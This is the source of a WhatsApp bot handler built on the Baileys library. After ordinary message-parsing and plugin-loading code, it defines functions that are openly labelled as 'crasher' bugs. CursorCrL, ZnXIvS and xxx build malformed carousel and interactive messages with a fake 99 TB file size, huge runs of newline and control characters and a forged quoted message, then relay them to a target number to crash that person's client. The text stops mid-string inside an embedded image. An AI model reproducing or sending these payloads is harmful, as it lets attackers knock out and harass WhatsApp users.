/*
╭────────────────────────────────────────
│ GitHub   : https://github.com/r-serex
│ YouTube  : https://youtube.com/@zxruzx
│ WhatsApp : https://wa.me/6288980698613
│ Telegram : https://rujekaciw.t.me
╰─────────────────────────────────────────
*/

require('./settings/config');

const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const util = require("util");
const fetch = require("node-fetch")
const moment = require("moment-timezone");
const path = require("path");
const crypto = require("crypto");
const os = require('os');
const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
const {
    spawn,
    exec,
    execSync
} = require('child_process');

const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    generateWAMessageContent,
    generateWAMessage,
    jidDecode,
    makeInMemoryStore,
    prepareWAMessageMedia,
    fetchLatestBaileysVersion,
    generateWAMessageFromContent,
    DisconnectReason,
    baileys,
    getContentType,
    proto,
} = require('@whiskeysockets/baileys');

module.exports = client = async (client, m, chatUpdate, store) => {
    try {
        const body = (
            m.mtype === "conversation" ? m.message.conversation :
                m.mtype === "imageMessage" ? m.message.imageMessage.caption :
                    m.mtype === "videoMessage" ? m.message.videoMessage.caption :
                        m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
                            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
                                m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
                                    m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
                                        m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
                                            m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
                                                m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : "");

        const sender = m.key.fromMe ? client.user.id.split(":")[0] + "@s.whatsapp.net" || client.user.id
            : m.key.participant || m.key.remoteJid;

        const senderNumber = sender.split('@')[0];
        const budy = (typeof m.text === 'string' ? m.text : '');
        const prefa = ["", "!", ".", ",", "🐤", "🗿"];

        const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
        const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
        const from = m.key.remoteJid;
        const isGroup = from.endsWith("@g.us");

        const kontributor = JSON.parse(fs.readFileSync('./start/lib/database/owner.json'));
        const botNumber = await client.decodeJid(client.user.id);
        const Access = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)

        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const command2 = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1);
        const pushname = m.pushName || "No Name";
        const text = q = args.join(" ");
        const quoted = m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted).mimetype || '';
        const qmsg = (quoted.msg || quoted);
        const isMedia = /image|video|sticker|audio/.test(mime);

        const groupMetadata = isGroup ? await client.groupMetadata(m.chat).catch((e) => { }) : "";
        const groupOwner = isGroup ? groupMetadata.owner : "";
        const groupName = m.isGroup ? groupMetadata.subject : "";
        const participants = isGroup ? await groupMetadata.participants : "";
        const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
        const groupMembers = isGroup ? groupMetadata.participants : "";
        const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
        const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;

        const {
            smsg,
            fetchJson,
            sleep,
            formatSize
        } = require('./start/lib/myfunction');

        const { remini } = require('./start/lib/function/remini');

        const cihuy = fs.readFileSync('./start/lib/media/orderM.png')
        const { fquoted } = require('./start/lib/fquoted')

        if (m.message) {
            console.log('\x1b[30m--------------------\x1b[0m');
            console.log(chalk.bgHex("#8b0000").bold(`📩  - New Message`));
            console.log(
                chalk.bgHex("#4a69bd").black(
                    `▢ Tanggal: ${new Date().toLocaleString()} \n` +
                    `▢ Pesan: ${m.body || m.mtype} \n` +
                    `▢ Pengirim: ${pushname} \n` +
                    `▢ JID: ${senderNumber}`
                )
            );

            if (m.isGroup) {
                console.log(
                    chalk.bgHex("#4a69bd").black(
                        `▢ Grup: ${groupName} \n` +
                        `▢ GroupJid: ${m.chat}`
                    )
                );
            }
            console.log();
        }

        //menghapus statusMention di Group
        if (m.mtype.includes("groupStatusMentionMessage") && m.isGroup) {
            await client.deleteMessage(m.chat, m.key);
        }

        const reaction = async (jidss, emoji) => {
            client.sendMessage(jidss, {
                react: {
                    text: emoji,
                    key: m.key
                }
            })
        };

        async function reply(text) {
            client.sendMessage(m.chat, {
                text: text,
                contextInfo: {
                    mentionedJid: [sender],
                    externalAdReply: {
                        title: `AppoloTheGreat - 2025`,
                        body: "WhatsApp Bot",
                        thumbnailUrl: "https://github.com/kiuur.png",
                        sourceUrl: global.linkch,
                        renderLargerThumbnail: false,
                    }
                }
            }, { quoted: m })
        }

        const pluginsLoader = async (directory) => {
            let plugins = [];
            const folders = fs.readdirSync(directory);
            folders.forEach(file => {
                const filePath = path.join(directory, file);
                if (filePath.endsWith(".js")) {
                    try {
                        const resolvedPath = require.resolve(filePath);
                        if (require.cache[resolvedPath]) {
                            delete require.cache[resolvedPath];
                        }
                        const plugin = require(filePath);
                        plugins.push(plugin);
                    } catch (error) {
                        console.log(`${filePath}:`, error);
                    }
                }
            });
            return plugins;
        };

        const pluginsDisable = true;
        const plugins = await pluginsLoader(path.resolve(__dirname, "./command"));
        const plug = { client, prefix, command, reply, text, Access, reaction, isGroup: m.isGroup, isPrivate: !m.isGroup, pushname, mime, quoted, sleep, fetchJson };

        for (let plugin of plugins) {
            if (plugin.command.find(e => e == command.toLowerCase())) {
                if (plugin.owner && !Access) {
                    return reply(mess.owner);
                }

                if (plugin.group && !plug.isGroup) {
                    return m.reply(mess.group);
                }

                if (plugin.private && !plug.isPrivate) {
                    return m.reply(mess.private);
                }

                if (typeof plugin !== "function") return;
                await plugin(m, plug);
            }
        }

        if (!pluginsDisable) return;

///////////========================={=============\\\
async function CursorCrL(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { text: '' },
          footer: { text: '' },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: '@appoloCrasher • #Since2025 🩸',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "164089", // 99 TB
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: "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",
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493]
                  },
                  hasMediaAttachment: true 
                },
                body: { text: "@appoloCrasher • #Since2025 🩸" },
                footer: { text: "@appoloCrasher • Since 2025\n" },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(10000) 
                }
              }
            ]
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",             
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },  
                    nativeFlowResponseMessage: {
                      name: "call_permission_request",
                      paramsJson: "{ burung.json }",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }
  }, {});

  // Kirim ke target langsung
  await client.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
  

  console.log(chalk.green(`Successfully Sent ${chalk.red("CursorCrL")} to ${target}`));
}

		const Qrad = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐉𝐚𝐜𝐤 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@JackV2\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(1045000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
		}

		async function ZnXIvS(target, Ptcp = true) {
			let etc = generateWAMessageFromContent(target, proto.Message.fromObject({
				viewOnceMessage: {
					message: {
						interactiveMessage: {
							header: {
								title: "",
								locationMessage: {},
								hasMediaAttachment: true
							},
							body: {
								text: "⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤"
							},
							nativeFlowMessage: {
								name: "call_permission_request",
								messageParamsJson: " 𝐀𝐦͢𝐛ͯ𝐚͢𝐓ͯ𝐳͢𝐲 〽️ "
							},
							carouselMessage: {}
						}
					}
				}
			}), {
				userJid: target,
				quoted: Qrad
			});
			await client.relayMessage(target, etc.message, Ptcp ? {
				participant: {
					jid: target
				}
			} : {});
			console.log(chalk.green("Bug Sending By AmbaTzy x Excel〽️"));
		};

async function xxx(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: { 
            text: '' 
          },
          footer: { 
            text: '' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: '@appoloCrasher • Since 2025 🩸',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: "108662672302080", // 99 TB
                    height: 1,
                    width: 1,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
jpegThumbnail: "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